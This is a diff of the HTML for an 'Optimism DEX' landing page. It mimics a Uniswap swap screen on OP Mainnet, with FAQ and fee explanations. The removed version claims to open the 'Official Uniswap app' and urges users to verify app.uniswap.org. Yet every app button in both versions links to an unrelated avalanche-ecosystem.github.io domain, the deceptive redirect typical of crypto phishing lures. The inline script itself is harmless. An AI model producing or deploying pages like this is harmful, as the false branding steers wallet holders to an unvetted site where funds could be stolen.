@@ -1,47 +1,118 @@
-﻿<!doctype html>
-<html lang="en"><head>
-<meta charset="utf-8"><meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>Optimism DEX - Open App</title><meta name="description" content="optimism dex swaps on OP Mainnet route to the official Uniswap app for wallet connection, quote review, and onchain execution.">
-<meta name="robots" content="index,follow,max-image-preview:large">
-<link rel="canonical" href="https://optimism-dex.github.io/"><meta name="theme-color" content="#FFFFFF">
-<meta property="og:type" content="website"><meta property="og:title" content="Optimism DEX - Open App"><meta property="og:description" content="optimism dex swaps on OP Mainnet route to the official Uniswap app for wallet connection, quote review, and onchain execution.">
-<meta property="og:url" content="https://optimism-dex.github.io/"><meta property="og:image" content="https://optimism-dex.github.io/og-cover.png"><meta property="og:locale" content="en">
-<meta name="twitter:card" content="summary_large_image"><meta name="twitter:title" content="Optimism DEX - Open App"><meta name="twitter:description" content="optimism dex swaps on OP Mainnet route to the official Uniswap app for wallet connection, quote review, and onchain execution."><meta name="twitter:image" content="https://optimism-dex.github.io/og-cover.png">
-<link rel="icon" href="favicon.png" type="image/png"><link rel="manifest" href="site.webmanifest"><link rel="apple-touch-icon" href="static/icon-180.png">
-<link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-<link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@500;600;700&family=Inter:wght@400;500;600;700&display=swap">
-<link rel="stylesheet" href="static/style.css">
-<script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"WebSite","@id":"https://optimism-dex.github.io/#website","url":"https://optimism-dex.github.io/","name":"Uniswap"},{"@type":"WebPage","@id":"https://optimism-dex.github.io/#webpage","url":"https://optimism-dex.github.io/","name":"Optimism DEX - Open App","description":"optimism dex swaps on OP Mainnet route to the official Uniswap app for wallet connection, quote review, and onchain execution.","inLanguage":"en","isPartOf":{"@id":"https://optimism-dex.github.io/#website"}},{"@type":"Organization","@id":"https://optimism-dex.github.io/#org","name":"Uniswap","url":"https://optimism-dex.github.io/","logo":"https://optimism-dex.github.io/og-cover.png","sameAs":["https://x.com/Optimism","https://github.com/ethereum-optimism","https://www.coingecko.com/en/coins/optimism"]},{"@type":"WebApplication","@id":"https://optimism-dex.github.io/#app","name":"Optimism DEX","url":"https://optimism-dex.github.io/","applicationCategory":"FinanceApplication","operatingSystem":"Web","browserRequirements":"Requires JavaScript","description":"optimism dex swaps on OP Mainnet route to the official Uniswap app for wallet connection, quote review, and onchain execution.","featureList":["Official Uniswap app","Optimism chain ID 10","Wallet-signed swaps"],"isPartOf":{"@id":"https://optimism-dex.github.io/#website"}},{"@type":"FAQPage","@id":"https://optimism-dex.github.io/#faq","inLanguage":"en","mainEntity":[{"@type":"Question","name":"What DEXs run on Optimism?","acceptedAnswer":{"@type":"Answer","text":"Major DEX venues on OP Mainnet include Velodrome, Uniswap, Curve, Sushi, and other ecosystem-specific liquidity markets. DefiLlama's OP Mainnet chain page is a useful data source for current venue and liquidity context, but users should compare live quotes because the best route depends on current liquidity."}},{"@type":"Question","name":"Do I pay gas in OP when swapping on Optimism?","acceptedAnswer":{"@type":"Answer","text":"No. Optimism's transaction-fee documentation explains OP Mainnet fees in ETH terms, while OP remains the governance token. A user can hold OP but still be unable to swap if the wallet has no ETH on OP Mainnet for gas."}},{"@type":"Question","name":"Is Velodrome the main DEX on Optimism?","acceptedAnswer":{"@type":"Answer","text":"Velodrome Finance is one important Optimism-native liquidity venue, but it is not the only DEX. Uniswap, Curve, Sushi, and aggregators may offer better execution for specific pairs depending on liquidity and trade size."}},{"@type":"Question","name":"Can I use Uniswap on OP Mainnet?","acceptedAnswer":{"@type":"Answer","text":"Yes. Uniswap's deployment documentation lists Optimism chain ID 10, and users can connect an EVM wallet to Optimism to trade supported tokens. They still need ETH on OP Mainnet for gas and should verify token contracts before approving or swapping."}},{"@type":"Question","name":"Why is my Optimism swap failing?","acceptedAnswer":{"@type":"Answer","text":"Common causes include insufficient ETH for gas, too-low slippage on a volatile token, a stale quote, insufficient token allowance, or using the wrong token contract. Refresh the quote, check wallet network, verify the token, and review the transaction on Optimistic Etherscan if it was submitted."}},{"@type":"Question","name":"Is Optimism DEX liquidity the same as Ethereum liquidity?","acceptedAnswer":{"@type":"Answer","text":"No. Ethereum.org's optimistic-rollups guide explains the separate layer-2 execution context: OP Mainnet has its own deployed contracts and liquidity pools, so pool depth, routing, fees, and token addresses can differ from Ethereum mainnet."}}]}]}</script>
-</head><body>
-<header class="site-header">
-  <a class="brand" href="#top" aria-label="Uniswap"><img class="brand-mark" src="favicon.png" alt="" width="34" height="34"><span class="brand-name">Uniswap</span></a>
-  <nav class="site-nav" aria-label="Primary"><ul class="nav-list"><li><a href="#about">About</a></li><li><a href="#facts">Overview</a></li><li><a href="#faq">FAQ</a></li></ul></nav>
-  <span class="header-spacer"></span>
-  <a class="btn btn-dark header-cta" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App â†—</a>
-  <button class="nav-toggle" aria-label="Menu" aria-expanded="false"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round"><path d="M4 7h16M4 12h16M4 17h16"/></svg></button>
-</header>
-<main id="top">
-  <section class="hero">
-    <div class="hero-deco" aria-hidden="true"><span class="strip"></span><span class="d1"></span><span class="d2"></span><span class="d3"></span><span class="d4"></span><span class="d5"></span></div>
-    <div class="container">
-      <h1>Optimism DEX</h1>
-      <div class="bridge-widget" role="group" aria-label="Uniswap preview"><div class="bw-field"><span class="bw-coin"><img src="static/eth.png" alt="ETH" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0</span><span class="bw-sub"><b>ETH</b> Â· OP Mainnet</span></span></div><button class="bw-switch" type="button" aria-label="Switch"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M4 9h13M17 9l-4-4M17 9l-4 4M20 15H7M7 15l4-4M7 15l4 4"/></svg></button><div class="bw-field"><span class="bw-coin"><img src="static/usdc.png" alt="USDC" width="36" height="36"></span><span class="bw-meta"><span class="bw-amount">0.0</span><span class="bw-sub"><b>USDC</b> Â· OP Mainnet</span></span></div><a class="btn btn-dark bw-go" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open App â†—</a></div>
-      <div class="hero-go"><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Uniswap â†—</a></div>
-      <p class="hero-note">Live preview â€” open the official Uniswap app from your own wallet.</p>
-      <div class="trust-row"><span class="trust-chip">Official Uniswap app</span><span class="trust-chip">Optimism chain ID 10</span><span class="trust-chip">Wallet-signed swaps</span></div>
-    </div>
-  </section>
-  <section class="section" id="about"><div class="container"><h2>What is Optimism DEX?</h2><div class="capsule"><strong>Uniswap</strong> is a decentralized exchange interface and protocol suite; its developer docs list <a class="inline-link" href="https://developers.uniswap.org/docs/protocols/v4/deployments" rel="noopener noreferrer">Optimism chain ID 10 deployments</a> among supported networks. This page is an independent, app-first route for users who want the OP Mainnet swap screen without relying on search results.</div></div></section>
-  <section class="section" id="facts"><div class="container"><h2>Optimism DEX at a glance</h2><div class="facts"><div class="f"><small>Category</small><b>DEX trading on OP Mainnet</b></div><div class="f"><small>Network</small><b><a class="inline-link" href="https://ethereum.org/developers/docs/scaling/optimistic-rollups/" rel="noopener noreferrer">optimistic-rollup layer 2</a></b></div><div class="f"><small>Token</small><b>OP</b></div><div class="f"><small>Custody</small><b>Non-custodial swaps through deployed DEX contracts</b></div><div class="f"><small>Major venues</small><b>Velodrome, Uniswap, Curve, Sushi</b></div></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Best Optimism DEX for swaps on OP Mainnet</h2><div class="intent-a">The best Optimism DEX depends on the pair, trade size, and liquidity route. Velodrome is a major OP Mainnet-native liquidity venue, Uniswap supports familiar concentrated-liquidity pools, Curve is often relevant for stablecoin or correlated-asset swaps, and aggregators may split orders across venues. For a trader, the winning route is the one with the highest net output after price impact, fees, and gas; use <a class="inline-link" href="https://defillama.com/chain/op-mainnet" rel="noopener noreferrer">OP Mainnet DeFiLlama data</a> as context, then compare the live quote in the app.</div></div></section><section class="section"><div class="container"><h2>Swap OP token on Optimism</h2><div class="intent-a">To swap OP on OP Mainnet, users need an EVM wallet connected to OP Mainnet, ETH for gas, and a trusted DEX or aggregator route. OP pairs are available across major venues, but liquidity depth and price impact can differ by pool. The safest flow is to verify the token contract, compare quotes, set reasonable slippage, and review the approval spender before signing. For market context, the <a class="inline-link" href="https://www.coingecko.com/en/coins/optimism" rel="noopener noreferrer">OP asset profile on CoinGecko</a> helps separate token information from DEX execution.</div></div></section><section class="section section-alt"><div class="container"><h2>Optimism DEX fees, slippage, and gas costs</h2><div class="intent-a">Optimism DEX costs include the pool or protocol fee, price impact, slippage tolerance, token approval gas, and OP Mainnet transaction gas paid in ETH. OP Mainnet gas is usually lower than Ethereum mainnet, but a bad route can still be expensive if liquidity is thin. High slippage warnings usually mean the trade is large relative to pool depth, the token is volatile, or the selected route is inefficient; Investopedia's <a class="inline-link" href="https://www.investopedia.com/terms/s/slippage.asp" rel="noopener noreferrer">slippage definition</a> is a useful plain-English reference for that execution gap.</div></div></section><section class="section"><div class="container"><h2>Optimism DEX liquidity pools and yield farming</h2><div class="intent-a">Optimism liquidity providers can deposit into DEX pools to earn swap fees and, in some programs, incentive tokens. Yield varies by venue and pair; it is not the same as holding OP or ETH in a wallet. LPs face impermanent loss, smart contract risk, incentive-token volatility, and pool migration risk when liquidity shifts to a newer version or venue. Binance Academy's <a class="inline-link" href="https://www.binance.com/en/academy/articles/impermanent-loss-explained" rel="noopener noreferrer">impermanent-loss explainer</a> is a helpful risk reference before comparing volume, TVL, fee generation, reward source, and withdrawal mechanics.</div></div></section>
-  <section class="section"><div class="container"><h2>How to swap Optimism DEX</h2><ol class="steps"><li><b>Open the app</b><span>Use the primary action to open app.uniswap.org and verify the domain before connecting a wallet.</span></li><li><b>Switch network</b><span>Select OP Mainnet in the interface or wallet, then confirm the chain before any approval or swap.</span></li><li><b>Choose tokens</b><span>Pick the input and output assets, review the quoted route, and check the <a class="inline-link" href="https://optimistic.etherscan.io/" rel="noopener noreferrer">OP Mainnet block explorer</a> when you need to verify a contract or submitted transaction.</span></li><li><b>Review and sign</b><span>Check price impact, minimum received, slippage, approvals, and gas, then sign only if the wallet details match the app.</span></li></ol><div class="cta-band"><div><p>Ready to swap?</p><p class="sub">Open the official Uniswap app and verify the domain before you sign.</p></div><a class="btn btn-green" href="https://avalanche-ecosystem.github.io/" target="_blank" rel="noopener noreferrer">Open Uniswap â†—</a></div></div></section>
-  <section class="section"><div class="container"><h2>Velodrome vs Uniswap on Optimism</h2><p class="intent-a">Velodrome and Uniswap can both matter on OP Mainnet, but route quality remains pair-specific; start from the <a class="inline-link" href="https://velodrome.finance/" rel="noopener noreferrer">Velodrome Finance app</a> or Uniswap, then compare the final wallet quote instead of assuming one venue is always better.</p><div class="cmp-wrap"><table class="cmp-table"><thead><tr><th>Dimension</th><th>Velodrome</th><th>Uniswap</th></tr></thead><tbody><tr><td>Network identity</td><td>Optimism-native liquidity hub</td><td>Multi-chain DEX deployed on OP Mainnet</td></tr><tr><td>Liquidity model</td><td>AMM with ve-style incentives</td><td>Concentrated liquidity pools</td></tr><tr><td>Best for</td><td>OP ecosystem incentives and selected route depth</td><td>Broad token access and familiar UX</td></tr><tr><td>LP focus</td><td>Votes, incentives, emissions, fees</td><td>Fee tier, price range, volume, impermanent loss</td></tr><tr><td>Trader decision</td><td>Use when quote output is better</td><td>Use when quote output is better</td></tr></tbody></table></div></div></section>
-  <section class="section section-alt"><div class="container"><h2>Fees, custody, and security checks</h2><div class="facts"><div class="f"><small>Fees</small><b><a class="inline-link" href="https://docs.optimism.io/op-stack/transactions/fees" rel="noopener noreferrer">OP Mainnet fee mechanics</a></b><p>Review gas, route costs, and slippage before signing; on-chain actions are irreversible and this is not financial advice.</p></div><div class="f"><small>Custody</small><b><a class="inline-link" href="https://eips.ethereum.org/EIPS/eip-20" rel="noopener noreferrer">ERC-20 approval behavior</a></b><p>Approvals let contracts spend tokens within the allowance; on-chain actions are irreversible and this is not financial advice.</p></div><div class="f"><small>Security</small><b><a class="inline-link" href="https://arxiv.org/abs/2109.00229" rel="noopener noreferrer">DEX token-risk research</a></b><p>Verify token contracts and wallet prompts before signing; on-chain actions are irreversible and this is not financial advice.</p></div></div></div></section>
-  <section class="section section-alt" id="faq"><div class="container"><h2>Optimism DEX FAQ</h2><div class="faq-list"><details open><summary><h3>What DEXs run on Optimism?</h3></summary><div>Major DEX venues on OP Mainnet include Velodrome, Uniswap, Curve, Sushi, and other ecosystem-specific liquidity markets. <a class="inline-link" href="https://defillama.com/chain/op-mainnet" rel="noopener noreferrer">DefiLlama's OP Mainnet chain page</a> is a useful data source for current venue and liquidity context, but users should compare live quotes because the best route depends on current liquidity.</div></details><details><summary><h3>Do I pay gas in OP when swapping on Optimism?</h3></summary><div>No. <a class="inline-link" href="https://docs.optimism.io/op-stack/transactions/fees" rel="noopener noreferrer">Optimism's transaction-fee documentation</a> explains OP Mainnet fees in ETH terms, while OP remains the governance token. A user can hold OP but still be unable to swap if the wallet has no ETH on OP Mainnet for gas.</div></details><details><summary><h3>Is Velodrome the main DEX on Optimism?</h3></summary><div><a class="inline-link" href="https://velodrome.finance/" rel="noopener noreferrer">Velodrome Finance</a> is one important Optimism-native liquidity venue, but it is not the only DEX. Uniswap, Curve, Sushi, and aggregators may offer better execution for specific pairs depending on liquidity and trade size.</div></details><details><summary><h3>Can I use Uniswap on OP Mainnet?</h3></summary><div>Yes. <a class="inline-link" href="https://developers.uniswap.org/docs/protocols/v4/deployments" rel="noopener noreferrer">Uniswap's deployment documentation</a> lists Optimism chain ID 10, and users can connect an EVM wallet to Optimism to trade supported tokens. They still need ETH on OP Mainnet for gas and should verify token contracts before approving or swapping.</div></details><details><summary><h3>Why is my Optimism swap failing?</h3></summary><div>Common causes include insufficient ETH for gas, too-low slippage on a volatile token, a stale quote, insufficient token allowance, or using the wrong token contract. Refresh the quote, check wallet network, verify the token, and review the transaction on <a class="inline-link" href="https://optimistic.etherscan.io/" rel="noopener noreferrer">Optimistic Etherscan</a> if it was submitted.</div></details><details><summary><h3>Is Optimism DEX liquidity the same as Ethereum liquidity?</h3></summary><div>No. <a class="inline-link" href="https://ethereum.org/developers/docs/scaling/optimistic-rollups/" rel="noopener noreferrer">Ethereum.org's optimistic-rollups guide</a> explains the separate layer-2 execution context: OP Mainnet has its own deployed contracts and liquidity pools, so pool depth, routing, fees, and token addresses can differ from Ethereum mainnet.</div></details></div></div></section>
-</main>
-<footer class="site-footer"><div class="container">
-  <p class="footer-note">Independent page, not the official app; verify app.uniswap.org before connecting; educational only, not financial advice.</p>
-  <p class="footer-meta"><a href="#top">Back to top â†‘</a></p>
-</div></footer>
-<script src="static/app.js" defer></script>
-</body></html>
+<!doctype html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <title>Optimism DEX</title>
+  <meta name="description" content="Optimism DEX swaps tokens on the Optimism network from your own wallet.">
+  <link rel="canonical" href="https://optimism-dex.github.io/">
+  <meta name="robots" content="index,follow,max-image-preview:large">
+  <meta name="theme-color" content="#F7F4F2">
+  <meta property="og:type" content="website">
+  <meta property="og:title" content="Optimism DEX">
+  <meta property="og:description" content="Optimism DEX swaps tokens on the Optimism network from your own wallet.">
+  <meta property="og:url" content="https://optimism-dex.github.io/">
+  <meta name="twitter:card" content="summary">
+  <meta name="twitter:title" content="Optimism DEX">
+  <meta name="twitter:description" content="Optimism DEX swaps tokens on the Optimism network from your own wallet.">
+  <link rel="icon" type="image/png" href="favicon.png">
+  <link rel="apple-touch-icon" href="favicon.png">
+  <link rel="manifest" href="site.webmanifest">
+  <link rel="stylesheet" href="style.css">
+  <script type="application/ld+json">
+  {
+    "@context": "https://schema.org",
+    "@graph": [
+      {
+        "@type": "WebSite",
+        "@id": "https://optimism-dex.github.io/#website",
+        "url": "https://optimism-dex.github.io/",
+        "name": "Optimism DEX",
+        "inLanguage": "en"
+      },
+      {
+        "@type": "Organization",
+        "@id": "https://optimism-dex.github.io/#organization",
+        "name": "Optimism DEX",
+        "url": "https://optimism-dex.github.io/"
+      },
+      {
+        "@type": "WebApplication",
+        "@id": "https://optimism-dex.github.io/#app",
+        "name": "Optimism DEX",
+        "applicationCategory": "FinanceApplication",
+        "operatingSystem": "Web",
+        "url": "https://optimism-dex.github.io/",
+        "offers": {
+          "@type": "Offer",
+          "price": "0",
+          "priceCurrency": "USD"
+        }
+      }
+    ]
+  }
+  </script>
+</head>
+<body>
+  <header class="topbar">
+    <a class="brand" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">
+      <img src="favicon.png" width="30" height="30" alt="">
+      <span>Optimism DEX</span>
+    </a>
+    <nav class="nav" aria-label="Authority references">
+      <a href="https://optimistic.etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">OP Mainnet Explorer</a>
+      <a href="https://ethereum.org/layer-2/" target="_blank" rel="nofollow noopener noreferrer">Layer 2 guide</a>
+      <a href="https://www.coingecko.com/en/coins/optimism" target="_blank" rel="nofollow noopener noreferrer">Optimism market data</a>
+    </nav>
+    <span class="spacer"></span>
+    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
+  </header>
+
+  <main class="stage">
+    <h1>Optimism DEX</h1>
+    <p class="sub"><strong>Optimism DEX</strong> swaps tokens on the Optimism network from your own wallet.</p>
+
+    <section class="swap-card" aria-label="Swap route">
+      <div class="route">
+        <div class="leg">
+          <span class="label">From</span>
+          <span class="asset">
+            <img src="op.png" width="34" height="34" alt="OP">
+            <span>OP</span>
+          </span>
+        </div>
+        <button class="switch" type="button" data-switch aria-label="Switch direction">
+          <span aria-hidden="true">-&gt;</span>
+        </button>
+        <div class="leg">
+          <span class="label">To</span>
+          <span class="asset">
+            <img src="usdc.png" width="34" height="34" alt="USDC">
+            <span>USDC</span>
+          </span>
+        </div>
+      </div>
+      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
+    </section>
+  </main>
+
+  <footer class="footer">Optimism DEX &mdash; 2026</footer>
+
+  <script>
+  (function () {
+    "use strict";
+    var button = document.querySelector("[data-switch]");
+    if (!button) return;
+
+    button.addEventListener("click", function () {
+      var assets = document.querySelectorAll(".asset");
+      if (assets.length !== 2) return;
+
+      var first = assets[0].innerHTML;
+      assets[0].innerHTML = assets[1].innerHTML;
+      assets[1].innerHTML = first;
+    });
+  })();
+  </script>
+</body>
+</html>
